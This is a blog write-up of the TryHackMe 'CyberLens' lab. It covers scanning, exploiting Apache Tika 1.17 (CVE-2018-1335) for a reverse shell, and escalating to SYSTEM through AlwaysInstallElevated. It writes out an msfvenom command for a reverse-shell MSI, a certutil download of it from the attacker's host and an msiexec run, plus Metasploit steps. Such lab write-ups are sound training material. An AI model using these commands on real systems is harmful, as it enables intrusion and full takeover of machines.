---
date: 2024-06-19T14:37:09-05:00
# description: ""
image: "/images/THM-CyberLens/CyberLens.svg"
showTableOfContents: true
tags: ["TryHackMe"]
categories: ["Writeups"]
title: "THM: CyberLens"
type: "post"
---

CyberLens features a website with a metadata extraction feature. After some enumeration we discover that the feature is powered by Apache Tika, an outadated version of the software vulnerable to `CVE-2018-1335` is running. We get our initial foothold by exploiting the vulnerability. For privilege escalation we abuse `AlwaysInstallElevated` to obtain a system shell.

## Scanning

We will use a Bash script to automate the scanning process. You can find it [here](https://github.com/K-Scorpio/scripts-collection/blob/main/nmap_scan.sh).

The script will:
* Scan a target IP for open ports
* Extract them
* Run a detailed scan on the open ports found and save the output in three different formats (.gnmap, .nmap, and .xml)

```shell
Running detailed scan on open ports: 80,135,139,445,3389,5985,47001,49664,49665,49667,49668,49669,49670,49677,61777
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-19 15:27 CDT
Nmap scan report for 10.10.212.189
Host is up (0.23s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.57 ((Win64))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: CyberLens: Unveiling the Hidden Matrix
|_http-server-header: Apache/2.4.57 (Win64)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-06-19T20:27:52+00:00; -20s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: CYBERLENS
|   NetBIOS_Domain_Name: CYBERLENS
|   NetBIOS_Computer_Name: CYBERLENS
|   DNS_Domain_Name: CyberLens
|   DNS_Computer_Name: CyberLens
|   Product_Version: 10.0.17763
|_  System_Time: 2024-06-19T20:27:42+00:00
| ssl-cert: Subject: commonName=CyberLens
| Not valid before: 2024-06-18T19:35:16
|_Not valid after:  2024-12-18T19:35:16
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
61777/tcp open  http          Jetty 8.y.z-SNAPSHOT
|_http-title: Welcome to the Apache Tika 1.17 Server
|_http-cors: HEAD GET
| http-methods: 
|_  Potentially risky methods: PUT
|_http-server-header: Jetty(8.y.z-SNAPSHOT)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-06-19T20:27:43
|_  start_date: N/A
|_clock-skew: mean: -20s, deviation: 0s, median: -21s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.15 seconds
```

## Enumeration

Visiting the target IP address we find a website with an upload feature. 

![CyberLens website](/images/THM-CyberLens/cyberlens-website.png)

After capturing the request we get when we click on `Get Metadata` we see that the web server is making a request to port `61777`.

![Request to port 61777](/images/THM-CyberLens/port-for-request.png)

Checking the port, we get to a web page featuring Apache Tika 1.17.

> "The Apache Tika toolkit detects and extracts metadata and text from over a thousand different file types (such as PPT, XLS, and PDF)." Source - https://github.com/apache/tika

![Apache Tika Server](/images/THM-CyberLens/Apache-Tika.png)

**We are able to solve this room entirely via Metasploit, this writeup will showcase the manual way and the Metasploit method.**

## Manual Exploitation

### User flag

Researching "Apache Tika 1.17 rce" leads us to [this](https://rhinosecuritylabs.com/application-security/exploiting-cve-2018-1335-apache-tika/) Rhino Security Labs article featuring CVE-2018-1335. A PoC is also available [here](https://github.com/RhinoSecurityLabs/CVEs/blob/master/CVE-2018-1335/CVE-2018-1335.py). To use it  we have to follow this example:

```
python3 CVE-2018-1335.py <host> <port> <command>
```

Since we are targeting a Windows machine we can make use of PowerShell to get a reverse shell.

> On [revshells.com](https://www.revshells.com/), we use a PowerShell #3 (base64) reverse shell

```
python3 CVE-2018-1335.py <Target_IP> <PORT_NUMBER> <INSERT REVSHELL HERE>
```
After running the exploit we get a connection on our listener, we have a shell as the user `cyberlens`.

![Apache Tika Server](/images/THM-CyberLens/initial-foothold.png)

We find the user flag on the user's Desktop.

![user.txt location](/images/THM-CyberLens/user-flag.png)

### Privilege Escalation

For the system enumeration we use [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS) and find that `AlwaysInstallElevated` is enabled.

![Winpeas finds AlwaysInstallElevated is enabled](/images/THM-CyberLens/AlwaysInstallElevated.png)

The `AlwaysInstallElevated` setting in Windows is a Group Policy setting that, when enabled, allows Windows Installer to install programs with elevated privileges (i.e., administrative rights) regardless of the user's current privilege level. This setting is controlled through two registry keys:

1. **HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated**
2. **HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated**

If both of these registry keys are set to `1`, it means that any user, including those with only standard user privileges, can install MSI packages with elevated (administrator) privileges. *You can read more about it [here](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated).*

[This](https://juggernaut-sec.com/alwaysinstallelevated/#Abusing_AlwaysInstallElevated_to_Obtain_a_SYSTEM_Shell) article explains how to abuse `AlwaysInstallElevated` to obtain a SYSTEM Shell.

1. We craft a malicious msi file

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.2.104.130 LPORT=1234 -a x64 --platform Windows -f msi -o evil.msi
```

![Malicious msi ile created with msfvenom](/images/THM-CyberLens/malicious-msi.png)

2. Send it to the target 

```
certutil.exe -urlcache -split -f http://IP_ADDRESS:PORT_NUMBER/evil.msi evil.msi
```

3. Execute the msi file 

```
msiexec /quiet /qn /i evil.msi
```

4. We get a connection on our listener as `nt authority\system`

![System shell](/images/THM-CyberLens/system-shell.png)

We can read the root flag (admin.txt) on the `Administrator` Desktop.

![System shell](/images/THM-CyberLens/root-flag-manual.png)

---

## Metasploit Method

### User flag

We know which software we are targeting, so we check Metasploit for exploits.

We do find an exploit for `Header Command Injection`.

![Metasploit fins exploit for Apache Tika](/images/THM-CyberLens/apache-tika-exploit.png)

> Make sure to set all the options correctly. The remote port should be `61777`.

After running the exploit we get a meterpreter shell.

![Meterpreter shell](/images/THM-CyberLens/meterpreter-shell.png)

We find the user flag on the user Desktop.

### Privilege Escalation

Now to elevate our privileges we can use the `exploit_suggester` in Metasploit to find some leads.

> You can background the current meterpreter shell with `background`

![Metasploit exploit suggester for privilege escalation](/images/THM-CyberLens/metasploit-privesc.png)

All we have to do is to provide a session number and run the module.

![Metasploit - Exploit suggester module use](/images/THM-CyberLens/exploit-suggester.png)

It finds five possible exploits for our target.

![Exploits list found by exploit suggester in Metasploit](/images/THM-CyberLens/exploits-list.png)

We start with the first one.

```
use exploit/windows/local/always_install_elevated
```

We need to provide a session number, a local host and a local port.

![AlwaysInstallElevated exploit in Metasploit](/images/THM-CyberLens/installed-elevated-exploit.png)

After running the exploit we get an elevated meterpreter session as `NT AUTHORITY\SYSTEM`.

![Meterpreter system shell](/images/THM-CyberLens/admin-shell.png)

## Closing Words

Metasploit is a powerful framework allowing you to automate a lot of tasks. I am still learning how to optimally use it in order to make my life easier. I found two resources that will be helpful:
* [Metasploit Unleashed](https://www.offsec.com/metasploit-unleashed/) - A free course by Offensive Security teaching you how to thoroughly use the framework.
* [Metasploit: The Penetration Tester's Guide](https://www.amazon.com/Metasploit-Penetration-Testers-David-Kennedy/dp/159327288X) - This book is old but it will deepen your understanding of the framework. If you end up liking it, know that the second edition is coming out in November 2024.

**Note:** OSCP seekers should learn **NOT** to rely too much on Metasploit because you are only allowed to use it once during the exam.
